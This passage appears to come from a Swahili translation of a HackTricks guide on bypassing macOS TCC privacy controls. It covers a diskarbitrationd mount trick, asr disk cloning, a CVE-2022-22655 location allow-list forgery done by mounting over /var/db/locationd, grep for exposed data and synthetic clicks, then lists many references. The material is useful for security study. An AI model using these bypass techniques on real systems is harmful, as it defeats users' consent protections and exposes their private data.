Kama ilivyoelezwa katika [original writeup](https://www.kandji.io/blog/macos-audit-story-part2), CVE hii ilitumia `diskarbitrationd` vibaya.<sup>[[16]](#references)</sup>

Function `DADiskMountWithArgumentsCommon` kutoka kwenye framework ya umma ya `DiskArbitration` ilifanya ukaguzi wa usalama. Hata hivyo, inawezekana kuikwepa kwa kuita `diskarbitrationd` moja kwa moja na hivyo kutumia vipengele vya `../` kwenye path na symlinks.

Hii ilimwezesha mshambulizi kufanya mounts kiholela katika eneo lolote, ikiwemo juu ya database ya TCC kutokana na entitlement `com.apple.private.security.storage-exempt.heritable` ya `diskarbitrationd`.

### asr

Tool **`/usr/sbin/asr`** iliwezesha kunakili diski nzima na kuimount katika eneo lingine, ikikwepa ulinzi wa TCC.

### CVE-2022-22655 - Location Services

Location Services **hazihifadhiwi** katika database ya TCC kama huduma nyingine. Hudumiwa na `locationd`, ambayo huhifadhi allow-list yake katika **`/var/db/locationd/clients.plist`**:<sup>[[4]](#references)</sup>

```bash
# Requires FDA to read
sudo plutil -p /var/db/locationd/clients.plist | head -40
```

Kila ingizo limeainishwa kwa client (bundle ID au executable path) na lina fields kama `Authorized`, `BundleId`, `Executable` na `Registered`.<sup>[[4]](#references)</sup>

Faili ya `clients.plist` yenyewe inalindwa na Sandbox/TCC na haiwezi kuhaririwa hata ukiwa root — lakini **directory ya `/var/db/locationd/` haikulindwa dhidi ya mount**. Kwa hiyo, mshambulizi anayeendesha kama root angeweza kuunda disk image yenye `clients.plist` yake mwenyewe (ambayo binary yake imewekewa alama ya `Authorized`), kui-mount juu ya directory hiyo, na kuwasha upya `locationd` ili allow-list iliyoghushiwa ianze kutumika.<sup>[[3]](#references)</sup>

> [!TIP]
> Huu ni muundo uleule wa TCC bypass za `hdiutil`/`mount` zilizo hapo juu: *file* inalindwa, lakini *directory* ilipo hailindwi, kwa hiyo unabadilisha directory nzima badala ya file.

## Kwa kutumia startup apps


{{#ref}}
../../../../macos-auto-start-locations.md
{{#endref}}

## Kwa kutumia grep

Katika matukio kadhaa, files huhifadhi taarifa nyeti kama barua pepe, nambari za simu, ujumbe... katika maeneo yasiyolindwa (jambo ambalo linahesabika kama vulnerability kwa Apple).

<figure><img src="../../../../../images/image (474).png" alt=""><figcaption></figcaption></figure>

## Synthetic Clicks

Hii haifanyi kazi tena, lakini [**ilifanya kazi zamani**](https://twitter.com/noarfromspace/status/639125916233416704/photo/1)**:**

<figure><img src="../../../../../images/image (29).png" alt=""><figcaption></figcaption></figure>

Njia nyingine inayotumia [**CoreGraphics events**](https://objectivebythesea.org/v2/talks/OBTS_v2_Wardle.pdf):<sup>[[17]](#references)</sup>

<figure><img src="../../../../../images/image (30).png" alt="" width="563"><figcaption></figcaption></figure>

## References

- [1] [CVE-2020–9934: Kupita mfumo wa macOS Transparency, Consent, and Control (TCC)](https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8)
- [2] [Kupita ulinzi wa faragha wa watumiaji wa macOS TCC kwa bahati mbaya na kwa makusudi](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
- [3] [CVE-2022-22655 - TCC Location Services bypass (ripoti ya awali)](https://theevilbit.github.io/posts/cve-2022-22655/)
- [4] [Carmen Sandiego yuko wapi duniani: Kutumia vibaya Location Services kwenye macOS](https://slyd0g.medium.com/where-in-the-world-is-carmen-sandiego-abusing-location-services-on-macos-10e9f4eefb71)
- [5] [Jamf Threat Labs - CVE-2024-44131: TCC bypass huiba data kutoka iCloud](https://www.jamf.com/blog/tcc-bypass-steals-data-from-icloud/)
- [6] [SQLite - `test_sqllog.c` (vigezo vya mazingira vya SQLITE_ENABLE_SQLLOG)](https://github.com/sqlite/sqlite/blob/master/src/test_sqllog.c)
- [7] [Apple - Ruhusu entitlement ya vigezo vya mazingira vya DYLD](https://developer.apple.com/documentation/bundleresources/entitlements/com.apple.security.cs.allow-dyld-environment-variables)
- [8] [The Eclectic Light Company - Notarization: runtime iliyoimarishwa](https://eclecticlight.co/2021/01/07/notarization-the-hardened-runtime/)
- [9] [TCC bypass ya Zero-Day yagunduliwa kwenye malware ya XCSSET](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/)
- [10] [OBTS v5.0: "Kinachotokea kwenye Mac yako, hubaki kwenye iCloud ya Apple?!" - Wojciech Regula](https://www.youtube.com/watch?v=_6e2LhmxVc0)
- [11] [Vulnerability mpya ya macOS, "powerdir," inaweza kusababisha ufikiaji wa data ya mtumiaji bila idhini](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/)
- [12] [Badilisha home directory na upite TCC, yaani CVE-2020-27937](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/)
- [13] [Cheza muziki na upite TCC, yaani CVE-2020-29621](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/)
- [14] [Jinsi ya kuiba kutoka kwa (Fire)fox](https://wojciechregula.blog/post/how-to-rob-a-firefox/)
- [15] [CVE-2023-26818 - Kupita TCC kwa kutumia Telegram kwenye macOS](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/)
- [16] [Kandji - Kugundua vulnerabilities za Apple: Ukaguzi wa diskarbitrationd na storagekitd, Sehemu ya 2](https://www.kandji.io/blog/macos-audit-story-part2)
- [17] [Patrick Wardle - Objective by the Sea v2.0: Synthetic Clicks na CoreGraphics Event Taps](https://objectivebythesea.org/v2/talks/OBTS_v2_Wardle.pdf)
- [18] [breakpointHQ/TCC-ClickJacking - Proof of Concept](https://github.com/breakpointHQ/TCC-ClickJacking)
- [19] [Stack Overflow - Kuweka vigezo vya mazingira kwenye OS X](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686)
- [20] [theevilbit - CVE-2020-9771: mount_apfs TCC bypass na kupandisha privilege](https://theevilbit.github.io/posts/cve_2020_9771/)
- [21] [theevilbit - CVE-2021-30808: TCC bypass kwa kuweka mount juu ya database ya TCC](https://theevilbit.github.io/posts/cve-2021-30808/)
- [22] [Njia 20+ za kupita mifumo ya faragha ya macOS](https://www.youtube.com/watch?v=W9GxnP8c8FU)
- [23] [Ushindi mkubwa dhidi ya TCC - Njia 20+ MPYA za kupita mifumo ya faragha ya MacOS](https://www.youtube.com/watch?v=a9hsxPdRxsY)
- [24] [Kutoka Spotlight hadi Apple Intelligence — Kutumia vibaya 0day ili kuiba data inayoendesha AI ya macOS](https://objective-see.org/blog/blog_0x81.html)
{{#include ../../../../../banners/hacktricks-training.md}}
